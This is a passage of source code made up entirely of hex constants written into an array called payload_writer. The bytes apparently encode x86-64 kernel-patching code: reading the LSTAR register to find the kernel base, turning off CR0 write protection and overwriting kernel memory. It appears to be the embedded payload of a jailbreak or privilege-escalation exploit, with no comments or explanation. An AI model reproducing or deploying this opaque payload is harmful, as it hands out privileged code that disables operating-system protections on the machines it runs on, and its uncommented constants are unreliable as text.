  payload_writer[2784] = 0x20e1c148;
  payload_writer[2785] = 0x262484c6;
  payload_writer[2786] = 0x89000001;
  payload_writer[2787] = 0xc6cb8948;
  payload_writer[2788] = 0x01272484;
  payload_writer[2789] = 0x48e50000;
  payload_writer[2790] = 0x84c6c309;
  payload_writer[2791] = 0x00012824;
  payload_writer[2792] = 0x84c65300;
  payload_writer[2793] = 0x00012924;
  payload_writer[2794] = 0x8d484800;
  payload_writer[2795] = 0x012424b4;
  payload_writer[2796] = 0x84c60000;
  payload_writer[2797] = 0x00012a24;
  payload_writer[2798] = 0x8d488300;
  payload_writer[2799] = 0xe3d940bb;
  payload_writer[2800] = 0x2484c6ff;
  payload_writer[2801] = 0x0000012b;
  payload_writer[2802] = 0x000cbaec;
  payload_writer[2803] = 0x84c60000;
  payload_writer[2804] = 0x00012c24;
  payload_writer[2805] = 0x84c65800;
  payload_writer[2806] = 0x00012d24;
  payload_writer[2807] = 0x84c64800;
  payload_writer[2808] = 0x00012e24;
  payload_writer[2809] = 0x84c68d00;
  payload_writer[2810] = 0x00012f24;
  payload_writer[2811] = 0x15ff1d00;
  payload_writer[2812] = 0x000032dc;
  payload_writer[2813] = 0x850fc085;
  payload_writer[2814] = 0xfffff7b2;
  payload_writer[2815] = 0x2444c748;
  payload_writer[2816] = 0x00035038;
  payload_writer[2817] = 0x838d4800;
  payload_writer[2818] = 0x00017750;
  payload_writer[2819] = 0x084d8b48;
  payload_writer[2820] = 0x000008ba;
  payload_writer[2821] = 0x7c8d4800;
  payload_writer[2822] = 0x8b483824;
  payload_writer[2823] = 0x31d0ff31;
  payload_writer[2824] = 0xc48148d2;
  payload_writer[2825] = 0x00000130;
  payload_writer[2826] = 0x5d5bd089;
  payload_writer[2827] = 0x55c35c41;
  payload_writer[2828] = 0x478b4853;
  payload_writer[2829] = 0x488b4c08;
  payload_writer[2830] = 0x408b4c48;
  payload_writer[2831] = 0x468b4840;
  payload_writer[2832] = 0x108b4808;
  payload_writer[2833] = 0x50fa8148;
  payload_writer[2834] = 0x75000003;
  payload_writer[2835] = 0x0082b940;
  payload_writer[2836] = 0x320fc000;
  payload_writer[2837] = 0x20e2c148;
  payload_writer[2838] = 0x48d18948;
  payload_writer[2839] = 0x8d48c109;
  payload_writer[2840] = 0xc5e530a9;
  payload_writer[2841] = 0x998d48ff;
  payload_writer[2842] = 0x00b53f30;
  payload_writer[2843] = 0x30b18d48;
  payload_writer[2844] = 0x4c015c15;
  payload_writer[2845] = 0x4bf09d8d;
  payload_writer[2846] = 0x8d4c0039;
  payload_writer[2847] = 0x394c0095;
  payload_writer[2848] = 0x858d4800;
  payload_writer[2849] = 0x0034af55;
  payload_writer[2850] = 0x000489e9;
  payload_writer[2851] = 0xfa814800;
  payload_writer[2852] = 0x00000355;
  payload_writer[2853] = 0x82b94075;
  payload_writer[2854] = 0x0fc00000;
  payload_writer[2855] = 0xe2c14832;
  payload_writer[2856] = 0xd1894820;
  payload_writer[2857] = 0x48c10948;
  payload_writer[2858] = 0xe0f0a98d;
  payload_writer[2859] = 0x8d48ffc5;
  payload_writer[2860] = 0xb53af099;
  payload_writer[2861] = 0xb18d4800;
  payload_writer[2862] = 0x015c1130;
  payload_writer[2863] = 0x209d8d4c;
  payload_writer[2864] = 0x4c003950;
  payload_writer[2865] = 0x5030958d;
  payload_writer[2866] = 0x8d480039;
  payload_writer[2867] = 0x34b38585;
  payload_writer[2868] = 0x0440e900;
  payload_writer[2869] = 0x81480000;
  payload_writer[2870] = 0x000370fa;
  payload_writer[2871] = 0xb9407500;
  payload_writer[2872] = 0xc0000082;
  payload_writer[2873] = 0xc148320f;
  payload_writer[2874] = 0x894820e2;
  payload_writer[2875] = 0xc10948d1;
  payload_writer[2876] = 0x00a98d48;
  payload_writer[2877] = 0x48ffc5e0;
  payload_writer[2878] = 0xcf10998d;
  payload_writer[2879] = 0x8d4800b5;
  payload_writer[2880] = 0x5cd040b1;
  payload_writer[2881] = 0x9d8d4c01;
  payload_writer[2882] = 0x003950f0;
  payload_writer[2883] = 0x00958d4c;
  payload_writer[2884] = 0x48003951;
  payload_writer[2885] = 0xb455858d;
  payload_writer[2886] = 0xf7e90034;
  payload_writer[2887] = 0x48000003;
  payload_writer[2888] = 0x0400fa81;
  payload_writer[2889] = 0x1e750000;
  payload_writer[2890] = 0x000082b9;
  payload_writer[2891] = 0x48320fc0;
  payload_writer[2892] = 0x4820e2c1;
  payload_writer[2893] = 0x8d48d009;
  payload_writer[2894] = 0xc1761098;
  payload_writer[2895] = 0xb08d4800;
  payload_writer[2896] = 0x01d5e850;
  payload_writer[2897] = 0x814825eb;
  payload_writer[2898] = 0x000405fa;
  payload_writer[2899] = 0xb9357500;
  payload_writer[2900] = 0xc0000082;
  payload_writer[2901] = 0xc148320f;
  payload_writer[2902] = 0x094820e2;
  payload_writer[2903] = 0x988d48d0;
  payload_writer[2904] = 0x00c174e0;
  payload_writer[2905] = 0x20b08d48;
  payload_writer[2906] = 0x4c01d5e7;
  payload_writer[2907] = 0x1ac0988d;
  payload_writer[2908] = 0x8d4c0005;
  payload_writer[2909] = 0x051ad090;
  payload_writer[2910] = 0x07054800;
  payload_writer[2911] = 0xe9000103;
  payload_writer[2912] = 0x00000392;
  payload_writer[2913] = 0x06fa8148;
  payload_writer[2914] = 0x75000004;
  payload_writer[2915] = 0x0082b91e;
  payload_writer[2916] = 0x320fc000;
  payload_writer[2917] = 0x20e2c148;
  payload_writer[2918] = 0x48d00948;
  payload_writer[2919] = 0x74d0988d;
  payload_writer[2920] = 0x8d4800c1;
  payload_writer[2921] = 0xd5e710b0;
  payload_writer[2922] = 0x48c0eb01;
  payload_writer[2923] = 0x0407fa81;
  payload_writer[2924] = 0x1e750000;
  payload_writer[2925] = 0x000082b9;
  payload_writer[2926] = 0x48320fc0;
  payload_writer[2927] = 0x4820e2c1;
  payload_writer[2928] = 0x8d48d009;
  payload_writer[2929] = 0xc1b4d098;
  payload_writer[2930] = 0xb08d4800;
  payload_writer[2931] = 0x01d62710;
  payload_writer[2932] = 0x814899eb;
  payload_writer[2933] = 0x000450fa;
  payload_writer[2934] = 0xb9407500;
  payload_writer[2935] = 0xc0000082;
  payload_writer[2936] = 0xc148320f;
  payload_writer[2937] = 0x894820e2;
  payload_writer[2938] = 0xc10948d1;
  payload_writer[2939] = 0x30a98d48;
  payload_writer[2940] = 0x48ffcf6a;
  payload_writer[2941] = 0x03e0998d;
  payload_writer[2942] = 0x8d4800d3;
  payload_writer[2943] = 0xea6460b1;
  payload_writer[2944] = 0x9d8d4c01;
  payload_writer[2945] = 0x0016a5b0;
  payload_writer[2946] = 0xc0958d4c;
  payload_writer[2947] = 0x480016a5;
  payload_writer[2948] = 0x3be7858d;
  payload_writer[2949] = 0xfbe90014;
  payload_writer[2950] = 0x48000002;
  payload_writer[2951] = 0x0470fa81;
  payload_writer[2952] = 0x28750000;
  payload_writer[2953] = 0x000082b9;
  payload_writer[2954] = 0x48320fc0;
  payload_writer[2955] = 0x4820e2c1;
  payload_writer[2956] = 0x0948d189;
  payload_writer[2957] = 0xa98d48c1;
  payload_writer[2958] = 0xffcf47c0;
  payload_writer[2959] = 0x70998d48;
  payload_writer[2960] = 0x4800d372;
  payload_writer[2961] = 0xd1a0b18d;
  payload_writer[2962] = 0x2feb01ea;
  payload_writer[2963] = 0x71fa8148;
  payload_writer[2964] = 0x75000004;
  payload_writer[2965] = 0x0082b940;
  payload_writer[2966] = 0x320fc000;
  payload_writer[2967] = 0x20e2c148;
  payload_writer[2968] = 0x48d18948;
  payload_writer[2969] = 0x8d48c109;
  payload_writer[2970] = 0xcf4830a9;
  payload_writer[2971] = 0x998d48ff;
  payload_writer[2972] = 0x00d372e0;
  payload_writer[2973] = 0x10b18d48;
  payload_writer[2974] = 0x4c01ead2;
  payload_writer[2975] = 0x98109d8d;
  payload_writer[2976] = 0x8d4c0016;
  payload_writer[2977] = 0x16982095;
  payload_writer[2978] = 0x858d4800;
  payload_writer[2979] = 0x00143277;
  payload_writer[2980] = 0x000281e9;
  payload_writer[2981] = 0xfa814800;
  payload_writer[2982] = 0x00000500;
  payload_writer[2983] = 0x82b93575;
  payload_writer[2984] = 0x0fc00000;
  payload_writer[2985] = 0xe2c14832;
  payload_writer[2986] = 0xd0094820;
  payload_writer[2987] = 0xe0988d48;
  payload_writer[2988] = 0x48010984;
  payload_writer[2989] = 0x1830b08d;
  payload_writer[2990] = 0x8d4c022c;
  payload_writer[2991] = 0x0115f098;
  payload_writer[2992] = 0x908d4c00;
  payload_writer[2993] = 0x00011600;
  payload_writer[2994] = 0xed6f0548;
  payload_writer[2995] = 0x43e90013;
  payload_writer[2996] = 0x48000002;
  payload_writer[2997] = 0x0503fa81;
  payload_writer[2998] = 0x10750000;
  payload_writer[2999] = 0x000082b9;
  payload_writer[3000] = 0x48320fc0;
  payload_writer[3001] = 0xc148d189;
  payload_writer[3002] = 0x17eb20e1;
  payload_writer[3003] = 0x05fa8148;
  payload_writer[3004] = 0x75000005;
  payload_writer[3005] = 0x0082b938;
  payload_writer[3006] = 0x320fc000;
  payload_writer[3007] = 0x20e2c148;
  payload_writer[3008] = 0x48d18948;
  payload_writer[3009] = 0x8d48c809;
  payload_writer[3010] = 0x0984e098;
  payload_writer[3011] = 0xb08d4801;
  payload_writer[3012] = 0x022c18b0;
  payload_writer[3013] = 0xf0988d4c;
  payload_writer[3014] = 0x4c000115;
  payload_writer[3015] = 0x1600908d;
  payload_writer[3016] = 0x05480001;
  payload_writer[3017] = 0x0013ee7f;
  payload_writer[3018] = 0x0001e9e9;
  payload_writer[3019] = 0xfa814800;
  payload_writer[3020] = 0x00000550;
  payload_writer[3021] = 0x82b93875;
  payload_writer[3022] = 0x0fc00000;
  payload_writer[3023] = 0xd1894832;
  payload_writer[3024] = 0x20e1c148;
  payload_writer[3025] = 0x48c80948;
  payload_writer[3026] = 0x3fc0988d;
  payload_writer[3027] = 0x8d480113;
  payload_writer[3028] = 0x2ef3b0b0;
  payload_writer[3029] = 0x988d4c02;
  payload_writer[3030] = 0x001b47d0;
  payload_writer[3031] = 0xe0908d4c;
  payload_writer[3032] = 0x48001b47;
  payload_writer[3033] = 0x3c3dfd05;
  payload_writer[3034] = 0x01a8e900;
  payload_writer[3035] = 0x81480000;
  payload_writer[3036] = 0x000553fa;
  payload_writer[3037] = 0xb9357500;
  payload_writer[3038] = 0xc0000082;
  payload_writer[3039] = 0xc148320f;
  payload_writer[3040] = 0x094820e2;
  payload_writer[3041] = 0x988d48d0;
  payload_writer[3042] = 0x01133fc0;
  payload_writer[3043] = 0xb0b08d48;
  payload_writer[3044] = 0x4c022ef3;
  payload_writer[3045] = 0x46d0988d;
  payload_writer[3046] = 0x8d4c001b;
  payload_writer[3047] = 0x1b46e090;
  payload_writer[3048] = 0xfd054800;
  payload_writer[3049] = 0xe9003c3c;
  payload_writer[3050] = 0x0000016a;
  payload_writer[3051] = 0x55fa8148;
  payload_writer[3052] = 0x75000005;
  payload_writer[3053] = 0x0082b938;
  payload_writer[3054] = 0x320fc000;
  payload_writer[3055] = 0x48d18948;
  payload_writer[3056] = 0x4820e1c1;
  payload_writer[3057] = 0x8d48c809;
  payload_writer[3058] = 0x138fc098;
  payload_writer[3059] = 0xb08d4801;
  payload_writer[3060] = 0x022f33b0;
  payload_writer[3061] = 0x40988d4c;
  payload_writer[3062] = 0x4c001b4a;
  payload_writer[3063] = 0x4a50908d;
  payload_writer[3064] = 0x0548001b;
  payload_writer[3065] = 0x003c40bd;
  payload_writer[3066] = 0x000129e9;
  payload_writer[3067] = 0xfa814800;
  payload_writer[3068] = 0x00000600;
  payload_writer[3069] = 0x82b92c75;
  payload_writer[3070] = 0x0fc00000;
  payload_writer[3071] = 0xe2c14832;
  payload_writer[3072] = 0xd0094820;
  payload_writer[3073] = 0x98988d48;
  payload_writer[3074] = 0x48011392;
  payload_writer[3075] = 0xf900b08d;
  payload_writer[3076] = 0x8d4c021b;
  payload_writer[3077] = 0x4592d098;
  payload_writer[3078] = 0x908d4c00;
  payload_writer[3079] = 0x004592e0;
  payload_writer[3080] = 0x814836eb;
  payload_writer[3081] = 0x000620fa;
  payload_writer[3082] = 0xb9387500;
  payload_writer[3083] = 0xc0000082;
  payload_writer[3084] = 0x8948320f;
  payload_writer[3085] = 0xe1c148d1;
  payload_writer[3086] = 0xc8094820;
  payload_writer[3087] = 0x98988d48;
  payload_writer[3088] = 0x480113d2;
  payload_writer[3089] = 0x3900b08d;
  payload_writer[3090] = 0x8d4c021c;
  payload_writer[3091] = 0x4592f098;
  payload_writer[3092] = 0x908d4c00;
  payload_writer[3093] = 0x00459300;
  payload_writer[3094] = 0x1ee70548;
  payload_writer[3095] = 0xb3e90024;
  payload_writer[3096] = 0x48000000;
  payload_writer[3097] = 0x0650fa81;
  payload_writer[3098] = 0x2c750000;
  payload_writer[3099] = 0x000082b9;
  payload_writer[3100] = 0x48320fc0;
  payload_writer[3101] = 0x4820e2c1;
  payload_writer[3102] = 0x8d48d009;
  payload_writer[3103] = 0x13d33898;
  payload_writer[3104] = 0xb08d4801;
  payload_writer[3105] = 0x02300160;
  payload_writer[3106] = 0xd0988d4c;
  payload_writer[3107] = 0x4c002336;
  payload_writer[3108] = 0x36e0908d;
  payload_writer[3109] = 0x36eb0023;
  payload_writer[3110] = 0x70fa8148;
  payload_writer[3111] = 0x75000006;
  payload_writer[3112] = 0x0082b935;
  payload_writer[3113] = 0x320fc000;
  payload_writer[3114] = 0x48d18948;
  payload_writer[3115] = 0x4820e1c1;
  payload_writer[3116] = 0x8d48c809;
  payload_writer[3117] = 0x13e35898;
  payload_writer[3118] = 0xb08d4801;
  payload_writer[3119] = 0x02300160;
  payload_writer[3120] = 0x80988d4c;
  payload_writer[3121] = 0x4c00233a;
  payload_writer[3122] = 0x3a90908d;
  payload_writer[3123] = 0x05480023;
  payload_writer[3124] = 0x000ad124;
  payload_writer[3125] = 0xc88340eb;
  payload_writer[3126] = 0xfa8148ff;
  payload_writer[3127] = 0x00000700;
  payload_writer[3128] = 0x00ee850f;
  payload_writer[3129] = 0x82b90000;
  payload_writer[3130] = 0x0fc00000;
  payload_writer[3131] = 0xe2c14832;
  payload_writer[3132] = 0xd0094820;
  payload_writer[3133] = 0xd8988d48;
  payload_writer[3134] = 0x480113e1;
  payload_writer[3135] = 0x5590b08d;
  payload_writer[3136] = 0x8d4c022c;
  payload_writer[3137] = 0x1cb73098;
  payload_writer[3138] = 0x908d4c00;
  payload_writer[3139] = 0x001cb750;
  payload_writer[3140] = 0x3efb0548;
  payload_writer[3141] = 0x8b49001d;
  payload_writer[3142] = 0x00011890;
  payload_writer[3143] = 0x40c74100;
  payload_writer[3144] = 0x00000004;
  payload_writer[3145] = 0x40c74100;
  payload_writer[3146] = 0x00000008;
  payload_writer[3147] = 0x40c74100;
  payload_writer[3148] = 0x00000014;
  payload_writer[3149] = 0x0002c700;
  payload_writer[3150] = 0x48000000;
  payload_writer[3151] = 0x8949138b;
  payload_writer[3152] = 0x8b483050;
  payload_writer[3153] = 0x51894916;
  payload_writer[3154] = 0x51894920;
  payload_writer[3155] = 0x978b4818;
  payload_writer[3156] = 0x00000130;
  payload_writer[3157] = 0x0013bf48;
  payload_writer[3158] = 0x00000000;
  payload_writer[3159] = 0xc7483801;
  payload_writer[3160] = 0xffff6042;
  payload_writer[3161] = 0x8948ffff;
  payload_writer[3162] = 0xc748587a;
  payload_writer[3163] = 0xffff6842;
  payload_writer[3164] = 0x200fffff;
  payload_writer[3165] = 0xd18948c2;
  payload_writer[3166] = 0xffe18148;
  payload_writer[3167] = 0x0ffffeff;
  payload_writer[3168] = 0xc641c122;
  payload_writer[3169] = 0xc641b803;
  payload_writer[3170] = 0x41010143;
  payload_writer[3171] = 0x000243c6;
  payload_writer[3172] = 0x0343c641;
  payload_writer[3173] = 0x43c64100;
  payload_writer[3174] = 0xc6410004;
  payload_writer[3175] = 0x41c30543;
  payload_writer[3176] = 0x41b802c6;
  payload_writer[3177] = 0x010142c6;
  payload_writer[3178] = 0x0242c641;
  payload_writer[3179] = 0x42c64100;
  payload_writer[3180] = 0xc6410003;
  payload_writer[3181] = 0x41000442;
  payload_writer[3182] = 0xc30542c6;
  payload_writer[3183] = 0xc63100c6;
  payload_writer[3184] = 0xc6c00140;
  payload_writer[3185] = 0xc6900240;
  payload_writer[3186] = 0xc6900340;
  payload_writer[3187] = 0x0f900440;
  payload_writer[3188] = 0xc031c222;
  payload_writer[3189] = 0x53c35d5b;
  payload_writer[3190] = 0x48c93145;
  payload_writer[3191] = 0x4110ec83;
  payload_writer[3192] = 0xb9ffc883;
  payload_writer[3193] = 0x00001002;
  payload_writer[3194] = 0x000003ba;
  payload_writer[3195] = 0x0008be00;
  payload_writer[3196] = 0xff310000;
  payload_writer[3197] = 0x2404c748;
  payload_writer[3198] = 0x00000666;
  payload_writer[3199] = 0x00104ae8;
  payload_writer[3200] = 0x748d4800;
  payload_writer[3201] = 0x8d480824;
  payload_writer[3202] = 0xffebcc3d;
  payload_writer[3203] = 0xc38948ff;
  payload_writer[3204] = 0x24448948;
  payload_writer[3205] = 0x0436e808;
  payload_writer[3206] = 0x89480000;
  payload_writer[3207] = 0xde8948e7;
  payload_writer[3208] = 0x000008ba;
  payload_writer[3209] = 0xe515ff00;
  payload_writer[3210] = 0x4800002b;
  payload_writer[3211] = 0x08bedf89;
  payload_writer[3212] = 0xe8000000;
  payload_writer[3213] = 0x0000101f;
  payload_writer[3214] = 0x24048b48;
  payload_writer[3215] = 0x10c48348;
  payload_writer[3216] = 0x8348c35b;
  payload_writer[3217] = 0x894818ec;
  payload_writer[3218] = 0x4808247c;
  payload_writer[3219] = 0x0824748d;
  payload_writer[3220] = 0xd83d8d48;
  payload_writer[3221] = 0xe8fffff9;
  payload_writer[3222] = 0x000003f4;
  payload_writer[3223] = 0x8348c031;
  payload_writer[3224] = 0x48c318c4;
  payload_writer[3225] = 0x1f06358d;
  payload_writer[3226] = 0xe8500000;
  payload_writer[3227] = 0xffffeb29;
  payload_writer[3228] = 0x28f205c7;
  payload_writer[3229] = 0x00000000;
  payload_writer[3230] = 0xc35a0000;
  payload_writer[3231] = 0x01ffbe53;
  payload_writer[3232] = 0x89480000;
  payload_writer[3233] = 0x3d8d48fb;
  payload_writer[3234] = 0x00001efb;
  payload_writer[3235] = 0x0008f8e8;
  payload_writer[3236] = 0x79c08500;
  payload_writer[3237] = 0xffc03114;
  payload_writer[3238] = 0x00296315;
  payload_writer[3239] = 0x358d4800;
  payload_writer[3240] = 0x00001eed;
  payload_writer[3241] = 0x75113883;
  payload_writer[3242] = 0x31c93129;
  payload_writer[3243] = 0x358d48d2;
  payload_writer[3244] = 0x00001ed3;
  payload_writer[3245] = 0xf43d8d48;
  payload_writer[3246] = 0xe800001e;
  payload_writer[3247] = 0x00000881;
  payload_writer[3248] = 0x09358d48;
  payload_writer[3249] = 0x8500001f;
  payload_writer[3250] = 0x481679c0;
  payload_writer[3251] = 0x1ee4358d;
  payload_writer[3252] = 0x89480000;
  payload_writer[3253] = 0xeabfe8df;
  payload_writer[3254] = 0x8d48ffff;
  payload_writer[3255] = 0x001f0435;
  payload_writer[3256] = 0xdf894800;
  payload_writer[3257] = 0xeaafe95b;
  payload_writer[3258] = 0x4153ffff;
  payload_writer[3259] = 0x010000b8;
  payload_writer[3260] = 0xfb894800;
  payload_writer[3261] = 0x010d8d48;
  payload_writer[3262] = 0x4800001f;
  payload_writer[3263] = 0x1efe158d;
  payload_writer[3264] = 0x8d480000;
  payload_writer[3265] = 0x001eff35;
  payload_writer[3266] = 0x3d8d4800;
  payload_writer[3267] = 0x00001f01;
  payload_writer[3268] = 0x0009ade8;
  payload_writer[3269] = 0x0fc08500;
  payload_writer[3270] = 0x00008888;
  payload_writer[3271] = 0x00b84100;
  payload_writer[3272] = 0x48000100;
  payload_writer[3273] = 0x1ed20d8d;
  payload_writer[3274] = 0x8d480000;
  payload_writer[3275] = 0x001ecf15;
  payload_writer[3276] = 0x358d4800;
  payload_writer[3277] = 0x00001eea;
  payload_writer[3278] = 0xed3d8d48;
  payload_writer[3279] = 0xe800001e;
  payload_writer[3280] = 0x0000097e;
  payload_writer[3281] = 0x5d78c085;
  payload_writer[3282] = 0x0000b841;
  payload_writer[3283] = 0x8d480001;
  payload_writer[3284] = 0x001ea70d;
  payload_writer[3285] = 0x158d4800;
  payload_writer[3286] = 0x00001ea4;
  payload_writer[3287] = 0xda358d48;
  payload_writer[3288] = 0x4800001e;
  payload_writer[3289] = 0x1edb3d8d;
  payload_writer[3290] = 0x53e80000;
  payload_writer[3291] = 0x85000009;
  payload_writer[3292] = 0x483278c0;
  payload_writer[3293] = 0x1edc358d;
  payload_writer[3294] = 0xb8410000;
  payload_writer[3295] = 0x00010000;
  payload_writer[3296] = 0x750d8d48;
  payload_writer[3297] = 0x4800001e;
  payload_writer[3298] = 0x1e72158d;
  payload_writer[3299] = 0x8d480000;
  payload_writer[3300] = 0x001ecc3d;
  payload_writer[3301] = 0x0928e800;
  payload_writer[3302] = 0x8d480000;
  payload_writer[3303] = 0x001e2f35;
  payload_writer[3304] = 0x79c08500;
  payload_writer[3305] = 0x358d4807;
  payload_writer[3306] = 0x00001e39;
  payload_writer[3307] = 0x5bdf8948;
  payload_writer[3308] = 0xffe9e4e9;
  payload_writer[3309] = 0x485355ff;
  payload_writer[3310] = 0x0108ec81;
  payload_writer[3311] = 0xffba0000;
  payload_writer[3312] = 0x48000000;
  payload_writer[3313] = 0x01245c8d;
  payload_writer[3314] = 0x48fd8948;
  payload_writer[3315] = 0xfce8de89;
  payload_writer[3316] = 0x48ffffe9;
  payload_writer[3317] = 0x32e8df89;
  payload_writer[3318] = 0x8500000a;
  payload_writer[3319] = 0x833574c0;
  payload_writer[3320] = 0x0027823d;
  payload_writer[3321] = 0x2c750100;
  payload_writer[3322] = 0x48df8948;
  payload_writer[3323] = 0x1e80358d;
  payload_writer[3324] = 0x82e80000;
  payload_writer[3325] = 0x4800000d;
  payload_writer[3326] = 0x8d48ef89;
  payload_writer[3327] = 0x001e7135;
  payload_writer[3328] = 0xe9cee800;
  payload_writer[3329] = 0x8d48ffff;
  payload_writer[3330] = 0x001e653d;
  payload_writer[3331] = 0x06ffe800;
  payload_writer[3332] = 0x0beb0000;
  payload_writer[3333] = 0x48de8948;
  payload_writer[3334] = 0xb5e8ef89;
  payload_writer[3335] = 0x48ffffe9;
  payload_writer[3336] = 0x0108c481;
  payload_writer[3337] = 0x5d5b0000;
  payload_writer[3338] = 0x3d8352c3;
  payload_writer[3339] = 0x00002737;
  payload_writer[3340] = 0x48187500;
  payload_writer[3341] = 0x1e48358d;
  payload_writer[3342] = 0x5ae80000;
  payload_writer[3343] = 0xc7ffffe9;
  payload_writer[3344] = 0x00271f05;
  payload_writer[3345] = 0x00000100;
  payload_writer[3346] = 0x4816eb00;
  payload_writer[3347] = 0x1e51358d;
  payload_writer[3348] = 0x42e80000;
  payload_writer[3349] = 0xc7ffffe9;
  payload_writer[3350] = 0x00270705;
  payload_writer[3351] = 0x00000000;
  payload_writer[3352] = 0x41c35800;
  payload_writer[3353] = 0x49535554;
  payload_writer[3354] = 0x8148fc89;
  payload_writer[3355] = 0x000100ec;
  payload_writer[3356] = 0x5915ff00;
  payload_writer[3357] = 0x85000028;
  payload_writer[3358] = 0x830579c0;
  payload_writer[3359] = 0x2debffc8;
  payload_writer[3360] = 0xbfe68948;
  payload_writer[3361] = 0x0000000e;
  payload_writer[3362] = 0x285a15ff;
  payload_writer[3363] = 0xc0850000;
  payload_writer[3364] = 0xe778c389;
  payload_writer[3365] = 0x000010ba;
  payload_writer[3366] = 0xe6894800;
  payload_writer[3367] = 0xffe7894c;
  payload_writer[3368] = 0x00296b15;
  payload_writer[3369] = 0xad15ff00;
  payload_writer[3370] = 0x89000028;
  payload_writer[3371] = 0xc48148d8;
  payload_writer[3372] = 0x00000100;
  payload_writer[3373] = 0x5c415d5b;
  payload_writer[3374] = 0x485355c3;
  payload_writer[3375] = 0x0118ec81;
  payload_writer[3376] = 0x05c70000;
  payload_writer[3377] = 0x000026a0;
  payload_writer[3378] = 0x00000001;
  payload_writer[3379] = 0x269205c7;
  payload_writer[3380] = 0x00000000;
  payload_writer[3381] = 0x8d480000;
  payload_writer[3382] = 0xe810245c;
  payload_writer[3383] = 0x0000017c;
  payload_writer[3384] = 0x001128e8;
  payload_writer[3385] = 0x0dc1e800;
  payload_writer[3386] = 0xd7e80000;
  payload_writer[3387] = 0xe800000f;
  payload_writer[3388] = 0xfffffce3;
  payload_writer[3389] = 0xe8c78948;
  payload_writer[3390] = 0xfffffd46;
  payload_writer[3391] = 0x000514e8;
  payload_writer[3392] = 0x158d4800;
  payload_writer[3393] = 0x00001dbd;
  payload_writer[3394] = 0x000100be;
  payload_writer[3395] = 0xdf894800;
  payload_writer[3396] = 0x15ffc031;
  payload_writer[3397] = 0x000028f0;
  payload_writer[3398] = 0xe8df8948;
  payload_writer[3399] = 0x0000055b;
  payload_writer[3400] = 0xe8e78948;
  payload_writer[3401] = 0xffffff3b;
  payload_writer[3402] = 0x2479c085;
  payload_writer[3403] = 0x48df8948;
  payload_writer[3404] = 0x1da0158d;
  payload_writer[3405] = 0x00be0000;
  payload_writer[3406] = 0x31000001;
  payload_writer[3407] = 0xc515ffc0;
  payload_writer[3408] = 0x48000028;
  payload_writer[3409] = 0x30e8df89;
  payload_writer[3410] = 0xe9000005;
  payload_writer[3411] = 0x000000bd;
  payload_writer[3412] = 0x000539be;
  payload_writer[3413] = 0xe7894800;
  payload_writer[3414] = 0xffe59ae8;
  payload_writer[3415] = 0x358d48ff;
  payload_writer[3416] = 0xfffffd18;
  payload_writer[3417] = 0x843d8d48;
  payload_writer[3418] = 0xe800001d;
  payload_writer[3419] = 0xffffe54a;
  payload_writer[3420] = 0xb2358d48;
  payload_writer[3421] = 0x48fffffe;
  payload_writer[3422] = 0x1d783d8d;
  payload_writer[3423] = 0x37e80000;
  payload_writer[3424] = 0x48ffffe5;
  payload_writer[3425] = 0x1b633d8d;
  payload_writer[3426] = 0xb8e80000;
  payload_writer[3427] = 0x48ffffe7;
  payload_writer[3428] = 0xfe1f358d;
  payload_writer[3429] = 0x8d48ffff;
  payload_writer[3430] = 0x001b503d;
  payload_writer[3431] = 0xe518e800;
  payload_writer[3432] = 0x8d48ffff;
  payload_writer[3433] = 0xfffcba35;
  payload_writer[3434] = 0x3d8d48ff;
  payload_writer[3435] = 0x00001d4e;
  payload_writer[3436] = 0xffe505e8;
  payload_writer[3437] = 0x358d48ff;
  payload_writer[3438] = 0xfffffd2e;
  payload_writer[3439] = 0x443d8d48;
  payload_writer[3440] = 0xe800001d;
  payload_writer[3441] = 0xffffe4f2;
  payload_writer[3442] = 0x41df8948;
  payload_writer[3443] = 0x000539b8;
  payload_writer[3444] = 0xe1894800;
  payload_writer[3445] = 0x31158d48;
  payload_writer[3446] = 0xbe00001d;
  payload_writer[3447] = 0x00000100;
  payload_writer[3448] = 0x15ffc031;
  payload_writer[3449] = 0x00002820;
  payload_writer[3450] = 0xe8df8948;
  payload_writer[3451] = 0x0000048b;
  payload_writer[3452] = 0x25753d83;
  payload_writer[3453] = 0x74000000;
  payload_writer[3454] = 0x0005bf0d;
  payload_writer[3455] = 0x15ff0000;
  payload_writer[3456] = 0x000025a4;
  payload_writer[3457] = 0xc031eaeb;
  payload_writer[3458] = 0xffe3cbe8;
  payload_writer[3459] = 0xdf8948ff;
  payload_writer[3460] = 0x10158d48;
  payload_writer[3461] = 0xbe00001d;
  payload_writer[3462] = 0x00000100;
  payload_writer[3463] = 0x15ffc031;
  payload_writer[3464] = 0x000027e4;
  payload_writer[3465] = 0xe8df8948;
  payload_writer[3466] = 0x0000044f;
  payload_writer[3467] = 0x18c48148;
  payload_writer[3468] = 0x31000001;
  payload_writer[3469] = 0xc35d5bc0;
  payload_writer[3470] = 0x25c0c748;
  payload_writer[3471] = 0xe9000000;
  payload_writer[3472] = 0x000014c0;
  payload_writer[3473] = 0x36c0c748;
  payload_writer[3474] = 0xe9000000;
  payload_writer[3475] = 0x000014b4;
  payload_writer[3476] = 0x0bc0c748;
  payload_writer[3477] = 0xe9000000;
  payload_writer[3478] = 0x000014a8;
  payload_writer[3479] = 0x1d358d48;
  payload_writer[3480] = 0x52000025;
  payload_writer[3481] = 0x813d8d48;
  payload_writer[3482] = 0x48000020;
  payload_writer[3483] = 0x258a05c7;
  payload_writer[3484] = 0x00000000;
  payload_writer[3485] = 0x4ce80000;
  payload_writer[3486] = 0x85000004;
  payload_writer[3487] = 0x482a74c0;
  payload_writer[3488] = 0x24fa358d;
  payload_writer[3489] = 0x8d480000;
  payload_writer[3490] = 0x001c9f3d;
  payload_writer[3491] = 0x0435e800;
  payload_writer[3492] = 0xc0850000;
  payload_writer[3493] = 0x8d481374;
  payload_writer[3494] = 0x0024e335;
  payload_writer[3495] = 0x3d8d4800;
  payload_writer[3496] = 0x00001c9b;
  payload_writer[3497] = 0x00041ee8;
  payload_writer[3498] = 0xd13d8b00;
  payload_writer[3499] = 0x48000024;
  payload_writer[3500] = 0x24d2158d;
  payload_writer[3501] = 0x8d480000;
  payload_writer[3502] = 0x001c9535;
  payload_writer[3503] = 0x03ede800;
  payload_writer[3504] = 0x3d8b0000;
  payload_writer[3505] = 0x000024b8;
  payload_writer[3506] = 0xf9158d48;
  payload_writer[3507] = 0x48000024;
  payload_writer[3508] = 0x1c8e358d;
  payload_writer[3509] = 0xd4e80000;
  payload_writer[3510] = 0x8b000003;
  payload_writer[3511] = 0x00249f3d;
  payload_writer[3512] = 0x158d4800;
  payload_writer[3513] = 0x00002518;
  payload_writer[3514] = 0x86358d48;
